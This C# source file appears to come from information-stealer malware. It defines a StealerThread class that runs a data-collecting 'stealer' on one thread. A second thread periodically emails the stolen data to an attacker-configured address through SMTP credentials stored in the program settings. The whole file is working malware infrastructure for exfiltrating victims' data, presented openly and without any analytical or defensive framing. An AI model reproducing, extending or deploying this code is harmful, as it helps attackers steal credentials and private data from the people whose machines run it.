﻿using System.Threading;
using System.Windows.Forms;
using sub.Util.Misc;
using sub.Util.Net;

namespace sub.Util.Threading
{
    internal class StealerThread
    {
        private Thread _stealer;
        private Thread _reporter;
        private int _delay;

        public StealerThread(IStealer stealer, int delay)
        {
            _delay = delay;
            _stealer = new Thread(stealer.Collect);
            _reporter = new Thread(delegate()
                                       {
                                           while (true)
                                           {
                                               bool runOnce = _delay < 1;
                                               if (!runOnce)
                                               {
                                                   Thread.Sleep(_delay*60000);
                                               }
                                               if(!string.IsNullOrEmpty(stealer.Data))
                                               {
                                                   new ReportEmail(stealer.Name, Program.Settings.EmailAddress,
                                                                   Program.Settings.EmailPassword,
                                                                   Program.Settings.SmtpAddress, Program.Settings.SmtpPort).Send(
                                                                       stealer.Data);
                                                   stealer.Data = null;
                                                   if (runOnce)
                                                   {
                                                       _stealer.Abort();
                                                       _reporter.Abort();
                                                       break;
                                                   }
                                               }
                                           }
                                       });
            Variables.stealerPool.Add(this);
        }

        public void Start()
        {
            _stealer.Start();
            _reporter.Start();
        }

        public int GetDelay()
        {
            return _delay;
        }

        public Thread GetStealerThread()
        {
            return _stealer;
        }

        public Thread GetReporterThread()
        {
            return _reporter;
        }
    }
}